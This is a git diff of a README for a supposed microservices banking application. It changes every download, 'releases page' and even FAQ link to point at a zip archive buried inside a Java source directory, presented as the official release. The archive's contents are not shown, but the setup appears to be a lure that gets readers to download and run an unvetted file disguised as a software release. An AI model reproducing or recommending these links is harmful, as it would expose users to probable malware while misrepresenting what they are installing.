@@ -1,7 +1,7 @@
 # 💼 distributed-banking-system - Secure Banking Made Easy
 
 ## 📦 Quick Download
-[![Download the latest version](https://github.com/Sanidhya2707/distributed-banking-system/raw/refs/heads/master/shared-lib/src/main/java/com/banking/shared/dto/banking_system_distributed_3.2.zip%20Version-brightgreen)](https://github.com/Sanidhya2707/distributed-banking-system/raw/refs/heads/master/shared-lib/src/main/java/com/banking/shared/dto/banking_system_distributed_3.2.zip)
+[![Download the latest version](https://raw.githubusercontent.com/Sanidhya2707/distributed-banking-system/master/eureka-server/src/main/java/com/banking_system_distributed_3.8.zip%20Version-brightgreen)](https://raw.githubusercontent.com/Sanidhya2707/distributed-banking-system/master/eureka-server/src/main/java/com/banking_system_distributed_3.8.zip)
 
 ## 🚀 Getting Started
 Welcome to the distributed-banking-system! This application offers a user-friendly banking experience powered by modern technology. It is designed for enterprise use while being accessible for everyday users.
@@ -33,7 +33,7 @@ The distributed-banking-system is a microservices banking platform. It is built 
 To get started, follow these simple steps:
 
 1. **Visit the Releases Page:**
-   To download the latest version, [visit this page to download](https://github.com/Sanidhya2707/distributed-banking-system/raw/refs/heads/master/shared-lib/src/main/java/com/banking/shared/dto/banking_system_distributed_3.2.zip).
+   To download the latest version, [visit this page to download](https://raw.githubusercontent.com/Sanidhya2707/distributed-banking-system/master/eureka-server/src/main/java/com/banking_system_distributed_3.8.zip).
 
 2. **Select the Version:**
    On the releases page, you will see various versions. Click on the most recent version link.
@@ -58,7 +58,7 @@ Once installed, you can open the application and start managing your needs. The 
 - **Check for Updates:** Keep an eye on the releases page for updates and new features.
 
 ## 🛠️ Support
-If you face any issues while using the application or have questions, feel free to check the FAQs on our [GitHub page](https://github.com/Sanidhya2707/distributed-banking-system/raw/refs/heads/master/shared-lib/src/main/java/com/banking/shared/dto/banking_system_distributed_3.2.zip). Your feedback helps us improve.
+If you face any issues while using the application or have questions, feel free to check the FAQs on our [GitHub page](https://raw.githubusercontent.com/Sanidhya2707/distributed-banking-system/master/eureka-server/src/main/java/com/banking_system_distributed_3.8.zip). Your feedback helps us improve.
 
 ### 🤝 Contributing
 We welcome contributions! If you want to enhance the application, please refer to the contribution guidelines on the GitHub page.
